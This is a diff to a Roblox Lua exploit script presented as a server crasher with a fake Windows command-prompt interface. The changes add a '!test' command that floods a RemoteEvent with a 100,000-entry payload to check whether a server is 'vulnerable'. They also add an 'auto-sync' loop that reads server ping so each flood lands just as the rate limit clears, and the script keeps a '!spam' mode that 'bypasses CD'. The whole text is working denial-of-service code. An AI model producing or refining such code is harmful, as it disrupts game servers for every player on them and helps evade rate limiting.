@@ -10,7 +10,6 @@ local playerGui = player:WaitForChild("PlayerGui")
 -- ═══════════ CORE LOGIC ═══════════
 local Children       = 180000
 local FireBurst      = 1.5
-local CooldownTime   = 5.0   -- 🚨 Time to wait for server rate limit to clear
 local Format         = "pair"
 
 local state = { running = false, thread = nil, remote = nil, cache = nil, passes = 0, isSpam = false }
@@ -73,6 +72,11 @@ local function fire()
     state.passes += 1
 end
 
+local function getPing()
+    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
+    return ok and math.floor(p) or 0
+end
+
 local function startCrash(isSpam)
     if state.running then return end
     state.running = true
@@ -83,20 +87,47 @@ local function startCrash(isSpam)
     
     state.thread = task.spawn(function()
         while state.running do
-            pcall(fire)
-            
             if state.isSpam then
-                task.wait(0.05) -- Spam mode goes fast
+                pcall(fire)
+                task.wait(0.05)
             else
-                -- ✅ COUNTDOWN LOGIC FOR RATE LIMIT
-                local cd = CooldownTime
-                while cd > 0 and state.running do
-                    -- Update the status line
-                    if type(updateStatus) == "function" then
-                        updateStatus(string.format("Waiting for CD: %.1fs", cd), Color3.fromRGB(255, 200, 50))
+                -- ✅ ADAPTIVE SYNC (Calculates exact server CD)
+                local pBefore = getPing()
+                pcall(fire)
+                
+                if type(updateStatus) == "function" then
+                    updateStatus("Fired! Waiting for server spike...", Color3.fromRGB(0, 200, 255))
+                end
+                
+                -- 1. Wait for the server to react (ping spike)
+                local timeOut = tick() + 2.5
+                local spiked = false
+                while tick() < timeOut and state.running do
+                    if getPing() > pBefore + 100 then
+                        spiked = true
+                        break
                     end
-                    task.wait(1)
-                    cd -= 1
+                    task.wait(0.05)
+                end
+                
+                -- 2. If it spiked, wait EXACTLY until it drops back down
+                if spiked then
+                    if type(updateStatus) == "function" then
+                        updateStatus("Server Processing... Waiting for exact CD", Color3.fromRGB(255, 200, 50))
+                    end
+                    while getPing() > pBefore + 50 and state.running do
+                        task.wait(0.2)
+                    end
+                    if type(updateStatus) == "function" then
+                        updateStatus("Server Ready! Firing...", Color3.fromRGB(0, 255, 0))
+                    end
+                    task.wait(0.1) -- Exact millisecond buffer
+                else
+                    -- If it didn't spike, the server ignored it. Wait 2 seconds to not trigger their rate limit filter.
+                    if type(updateStatus) == "function" then
+                        updateStatus("Ignored. Buffering CD...", Color3.fromRGB(255, 50, 50))
+                    end
+                    task.wait(2)
                 end
             end
         end
@@ -108,11 +139,6 @@ local function stopCrash()
     if state.thread then pcall(task.cancel, state.thread) end
     state.thread = nil
     state.cache = nil
-end
-
-local function getPing()
-    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-    return ok and math.floor(p) or 0
 end
 
 -- ═══════════ CMD PROMPT UI ═══════════
@@ -247,7 +273,7 @@ statusLabel.Size = UDim2.new(1, -16, 0, 14)
 statusLabel.Position = UDim2.new(0, 8, 1, -52)
 statusLabel.BackgroundTransparency = 1
 statusLabel.Font = Enum.Font.Code
-statusLabel.Text = ""
+statusLabel.Text = "Idle."
 statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 statusLabel.TextSize = 12
 statusLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -305,10 +331,10 @@ local function processCommand(input)
     
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 255, 0))
+        log("  !test           - Check if the server is vulnerable", Color3.fromRGB(0, 200, 255))
+        log("  !crash          - Auto-Sync Crasher (Exact CD)", Color3.fromRGB(200, 200, 200))
         log("  !spam           - Bypasses CD, sprays ALL remotes", Color3.fromRGB(255, 100, 255))
-        log("  !crash          - Safe crasher WITH CD Countdown", Color3.fromRGB(200, 200, 200))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !cdtime <sec>   - Change CD countdown wait time (Default 5s)", Color3.fromRGB(200, 200, 200))
         log("  !limit          - Find max safe size", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size", Color3.fromRGB(200, 200, 200))
         log("  !burst <number> - Set fire burst", Color3.fromRGB(200, 200, 200))
@@ -316,6 +342,48 @@ local function processCommand(input)
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
         log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
         
+    elseif cmd == "!test" then
+        log("[*] Starting Server Vulnerability Test...", Color3.fromRGB(0, 200, 255))
+        task.spawn(function()
+            local remote = resolve()
+            if not remote then 
+                log("[!] Remote not found. Server is completely patched.", Color3.fromRGB(255, 50, 50)) 
+                return 
+            end
+            
+            local wasRunning = state.running
+            if wasRunning then stopCrash() end
+            
+            local testSize = 100000
+            log("[*] Firing " .. testSize .. " payload...", Color3.fromRGB(200, 200, 200))
+            
+            local before = getPing()
+            
+            local p = {}
+            for j = 1, testSize do
+                p[j] = {id = j, v = j}
+                if j % 10000 == 0 then task.wait() end
+            end
+            
+            pcall(function() remote:FireServer(p) end)
+            log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
+            
+            task.wait(3)
+            local after = getPing()
+            local spike = after - before
+            
+            log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
+            
+            if spike > 150 or after > 500 then
+                log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
+                log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
+            else
+                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG.", Color3.fromRGB(255, 50, 50))
+            end
+            
+            if wasRunning then startCrash(false) end
+        end)
+
     elseif cmd == "!spam" then
         if state.running then stopCrash() end
         log("[!!!] SPAM MODE ACTIVATED. Ignoring CD...", Color3.fromRGB(255, 100, 255))
@@ -326,7 +394,7 @@ local function processCommand(input)
             log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
         else
             startCrash(false)
-            log("[+] Crasher started. CD Countdown active.", Color3.fromRGB(0, 255, 0))
+            log("[+] Auto-Sync Crasher started. Reading server ping for exact CD.", Color3.fromRGB(0, 255, 0))
         end
         
     elseif cmd == "!stop" then
@@ -335,7 +403,7 @@ local function processCommand(input)
         else
             stopCrash()
             log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
-            updateStatus("", Color3.fromRGB(200, 200, 200))
+            updateStatus("Idle.", Color3.fromRGB(200, 200, 200))
         end
         
     elseif cmd == "!ping" then
@@ -411,15 +479,6 @@ local function processCommand(input)
         else
             log("[!] Invalid number. Example: !burst 2", Color3.fromRGB(255, 50, 50))
         end
-
-    elseif args[1] == "!cdtime" then
-        local num = tonumber(args[2])
-        if num and num > 0 then
-            CooldownTime = num
-            log("[+] CD Countdown set to " .. tostring(CooldownTime) .. " seconds", Color3.fromRGB(0, 255, 0))
-        else
-            log("[!] Invalid number. Example: !cdtime 5", Color3.fromRGB(255, 50, 50))
-        end
         
     elseif cmd == "" then
         -- Do nothing
@@ -438,20 +497,11 @@ inputBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
-task.spawn(function()
-    while screenGui.Parent do
-        task.wait(1)
-        if state.running and not state.isSpam then
-            -- Jitter logic here
-        end
-    end
-end)
-
 log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200))
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: If '!crash' gets rate limited, use '!spam' to bypass it.", Color3.fromRGB(255, 100, 255))
+log("Pro tip: Use '!crash'. It uses auto-sync to hit exactly when the server is ready.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
